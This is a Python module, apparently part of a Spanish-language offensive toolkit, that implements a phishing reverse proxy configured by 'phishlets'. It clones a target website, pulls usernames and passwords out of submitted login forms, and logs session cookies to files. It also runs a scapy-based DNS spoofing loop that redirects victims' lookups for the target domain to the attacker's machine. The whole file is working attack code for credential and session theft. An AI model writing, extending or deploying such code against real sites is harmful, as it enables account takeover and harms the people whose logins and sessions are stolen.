import threading
import socketserver
import http.server
import urllib.parse
import os
import json
import ssl
from modulos.config import _estado, _dns_reglas, IP_LOCAL, DIR_BASE

class UniversalProxyModule:
    """Módulo para captura de credenciales via servidor proxy reverso dinámico."""
    
    def __init__(self, logger_engine):
        self.logger = logger_engine
        self._server = None
        self._server_thread = None
        self.target_url = ""
        self.phishlets_dir = os.path.join(DIR_BASE, "data", "phishlets")
        self.active_phishlet = None
        
        # Ensure phishlets dir exists
        os.makedirs(self.phishlets_dir, exist_ok=True)
    
    def load_phishlet(self, name):
        """Carga la configuración JSON de un phishlet por su nombre."""
        path = os.path.join(self.phishlets_dir, f"{name}.json")
        if not os.path.exists(path):
            return False
            
        try:
            with open(path, "r", encoding="utf-8") as f:
                self.active_phishlet = json.load(f)
            return True
        except Exception as e:
            self.logger.log(f"[PROXY] Error cargando phishlet {name}: {e}", "err")
            return False
            
    def get_available_phishlets(self):
        """Devuelve una lista de nombres de phishlets disponibles."""
        if not os.path.exists(self.phishlets_dir):
            return []
        return [f.replace(".json", "") for f in os.listdir(self.phishlets_dir) if f.endswith(".json")]

    def start_server(self, target_url, phishlet_name, write_callback, stop_callback, use_https=False):
        """Inicia el servidor proxy reverso."""
        if self._server is not None:
            write_callback("✗ El servidor ya está en ejecución.\n")
            return False
            
        self.target_url = target_url.rstrip("/")
        
        if not self.load_phishlet(phishlet_name):
             write_callback(f"✗ Error: No se pudo cargar el phishlet '{phishlet_name}'\n")
             return False
        
        write_callback(f"» Phishlet '{phishlet_name}' cargado exitosamente.\n")
        
        port = 443 if use_https else 80
        
        try:
            handler_cls = self._make_handler(write_callback)
            socketserver.TCPServer.allow_reuse_address = True
            srv = socketserver.TCPServer(("", port), handler_cls)
            
            if use_https:
                # Need an ad-hoc cert for HTTPS proxying or a valid one
                cert_path = os.path.join(DIR_BASE, "data", "cert.pem")
                key_path = os.path.join(DIR_BASE, "data", "key.pem")
                
                if not os.path.exists(cert_path) or not os.path.exists(key_path):
                     write_callback("✗ ERROR: Faltan archivos cert.pem / key.pem para HTTPS en carpeta data/.\n")
                     return False
                     
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(certfile=cert_path, keyfile=key_path)
                srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
            
            self._server = srv
            t = threading.Thread(target=srv.serve_forever, daemon=True)
            t.start()
            self._server_thread = t
            
            proto = "https" if use_https else "http"
            write_callback(f"✔ Universal Proxy activo en {proto}://{IP_LOCAL}:{port}\n")
            write_callback(f"  ↬ Clonando objetivo: {self.target_url}\n")
            self.logger.log(f"[PROXY] {proto.upper()} puerto {port} -> {self.target_url}", "warn")
            return True
        except PermissionError:
            write_callback(f"✗ ERROR: Puerto {port} requiere privilegios de Administrador o ya está en uso.\n")
            self.logger.log(f"[PROXY] Error: sin permisos para puerto {port}.", "err")
            self._server = None
            return False
        except Exception as e:
            write_callback(f"✗ Error iniciando servidor proxy: {e}\n")
            self.logger.log(f"[PROXY] Error: {e}", "err")
            self._server = None
            return False
    
    def stop_server(self, write_callback):
        """Detiene el servidor HTTP."""
        if self._server is None:
            write_callback("✗ No hay servidor proxy activo.\n")
            return
        
        try:
            self._server.shutdown()
            self._server.server_close()
        except Exception:
            pass
        self._server = None
        write_callback("● Servidor proxy detenido.\n")
        self.logger.log("[PROXY] Servidor web detenido.", "warn")
    
    def _make_handler(self, write_callback):
        """Crea y devuelve la clase handler HTTP con funcionalidad de Proxy Reverso."""
        logger = self.logger
        target = getattr(self, "target_url", "https://ejemplo.com")
        phishlet = self.active_phishlet
        
        class DynamicProxyHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass  # Silenciar logs ruidosos
            
            def do_GET(self):
                self._proxy_request("GET")
            
            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length) if length > 0 else None
                
                # Interceptar cuerpos POST dinámicamente según el phishlet
                if body and phishlet:
                    try:
                        texto = body.decode("utf-8", errors="ignore")
                        params = urllib.parse.parse_qs(texto)
                        
                        user_val = ""
                        pass_val = ""
                        
                        # Buscar los campos que dice el JSON
                        for u_field in phishlet.get("username_fields", []):
                            if u_field in params:
                                user_val = params[u_field][0]
                                break
                                
                        for p_field in phishlet.get("password_fields", []):
                            if p_field in params:
                                pass_val = params[p_field][0]
                                break
                        
                        if user_val and pass_val:
                            msg = f"[!] LOGIN INTERCEPTADO ({phishlet.get('name', 'N/A')}): User: {user_val} | Pass: {pass_val}"
                            logger.log(msg, "err")
                            write_callback("► " + msg + "\n")
                            # Guardar en archivo
                            try:
                                import os
                                os.makedirs("logs", exist_ok=True)
                                with open("logs/tokens.txt", "a", encoding="utf-8") as f:
                                    f.write(f"[CRED] {target} -> u:{user_val} p:{pass_val}\n")
                            except Exception:
                                pass
                    except Exception:
                        pass
                
                self._proxy_request("POST", body)
                
            def _proxy_request(self, method, body=None):
                url = target + self.path
                
                # Excluir cabeceras incompatibles o problemáticas
                req_headers = {k: v for k, v in self.headers.items() 
                               if k.lower() not in ['host', 'accept-encoding', 'content-length']}
                
                try:
                    import requests
                    # Hacemos la petición al servidor original, deshabilitando SSL verify
                    resp = requests.request(method, url, headers=req_headers, data=body, 
                                            allow_redirects=False, verify=False)
                except Exception as e:
                    self.send_error(502, f"Bad Gateway (Target inalcanzable)")
                    return
                
                self.send_response(resp.status_code)
                
                content = resp.content
                content_type = resp.headers.get("Content-Type", "")
                
                # SUB-FILTERS dinámicos: Modificar HTML al vuelo para que los links apunten al proxy
                # En lugar de hardcodear dominios, reemplazamos el netloc objetivo
                if "text/html" in content_type:
                    target_domain = urllib.parse.urlparse(target).netloc
                    if target_domain:
                        content = content.replace(target_domain.encode('utf-8'), IP_LOCAL.encode('utf-8'))
                
                for k, v in resp.headers.items():
                    if k.lower() in ["content-encoding", "transfer-encoding", "content-length"]:
                        continue
                    if k.lower() == "set-cookie":
                        self._capture_cookie(v)
                    self.send_header(k, v)
                
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                
                self.wfile.write(content)
                
            def _capture_cookie(self, cookie_str):
                # Captura todas las cookies configurando un log de JSON crudo
                msg = f"[*] COOKIE SESIÓN CAPTURADA: {cookie_str[:50]}..."
                
                criticas = ["session", "token", "moodle", "auth", "sid", "li_at", "JSESSIONID"]
                is_critica = any(c in cookie_str.lower() for c in criticas)
                
                if is_critica:
                    logger.log(msg, "warn")
                    write_callback("  " + msg + "\n")
                
                # Siempre logueamos la cookie completa
                try:
                    import os
                    os.makedirs("logs", exist_ok=True)
                    with open("logs/cookies.txt", "a", encoding="utf-8") as f:
                        f.write(f"[{target}] {cookie_str}\n")
                except Exception:
                    pass
        
        return DynamicProxyHandler
    
    def activate_dynamic_proxy(self, target_url, phishlet_name, write_callback):
        """Activa automáticamente: regla DNS dinámica → IP_LOCAL + servidor Proxy HTTP con Phishlet."""
        self.target_url = target_url.rstrip("/")
        target_domain = urllib.parse.urlparse(self.target_url).netloc
        if not target_domain:
            target_domain = self.target_url # fallback rough
            
        if not self.load_phishlet(phishlet_name):
             write_callback(f"✗ Error: No se encontró el phishlet {phishlet_name}.\n")
             return False
             
        # Override target_domain intercept behavior if phishlet has it (Optional Enhancement)
        phishlet_domains = self.active_phishlet.get("intercept_domains", [])
        if phishlet_domains:
            intercept = phishlet_domains[0]
            # Podríamos añadir múltiples reglas dns, de momento usamos el principal
            
        # 1. Añadir regla DNS dinámica
        _dns_reglas[target_domain] = IP_LOCAL
        write_callback(f"✔ Regla DNS automática: {target_domain} → {IP_LOCAL}\n")
        self.logger.log(f"[PROXY] DNS: {target_domain} → {IP_LOCAL}", "warn")
        
        # 2. Activar DNS Spoofing si scapy está disponible
        scapy_available = False
        try:
            import scapy.all
            scapy_available = True
        except ImportError:
            pass
        
        if scapy_available and not _estado["dns"].is_set():
            _estado["dns"].set()
            threading.Thread(target=self._dns_loop, args=(write_callback,), daemon=True).start()
            write_callback("✔ DNS Spoofing iniciado automáticamente.\n")
        elif not scapy_available:
            write_callback("⚠ Scapy no disponible — DNS Spoofing omitido. El Proxy sí se activa.\n")
        
        # 3. Iniciar servidor Proxy de captura
        use_https = target_url.lower().startswith("https")
        if use_https:
            write_callback("» Detectado objetivo HTTPS. Validando cert.pem y key.pem...\n")
            
        if not self.start_server(target_url, phishlet_name, write_callback, lambda: None, use_https=use_https):
            if scapy_available:
                _estado["dns"].clear()
                write_callback("⚠ DNS Spoofing revertido por fallo del Proxy.\n")
            return False
            
        write_callback(f"✔ Modo Proxy Dinámico '{phishlet_name}' activo. Interceptando...\n")
        self.logger.log(f"[PROXY] Proxy Dinámico activo clonando {target_domain}.", "err")
        return True
    
    def _dns_loop(self, write_callback):
        """Loop de DNS spoofing."""
        try:
            from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff
        except ImportError:
            return
        
        def proc(pkt):
            if not _estado["dns"].is_set(): 
                return
            if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0): 
                return
            nombre = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            for dom, ip_f in _dns_reglas.items():
                if dom in nombre:
                    resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                            UDP(dport=pkt[UDP].sport, sport=53) /
                            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=ip_f)))
                    send(resp, verbose=0)
                    msg = f"  ↬ {nombre:<35} → {ip_f}\n"
                    write_callback(msg)
                    self.logger.log(f"[DNS] {nombre} → {ip_f}", "pkt")
                    return
        
        try:
            sniff(filter="udp port 53", prn=proc,
                  stop_filter=lambda _: not _estado["dns"].is_set(), store=False)
        except Exception as e:
            write_callback(f"✗ Error: {e}\n")
            self.logger.log(f"[DNS] Error: {e}", "err")
        finally:
            _estado["dns"].clear()

